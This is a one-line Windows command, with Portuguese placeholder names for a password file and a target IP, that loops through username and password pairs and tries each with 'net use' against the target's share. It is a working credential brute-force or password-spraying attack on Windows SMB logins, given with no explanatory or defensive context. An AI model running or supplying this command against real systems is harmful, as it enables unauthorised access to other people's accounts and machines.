for /f "tokens=1,2" %i in (senhas.txt) do net use \\<ip_alvo> %j /user:%i
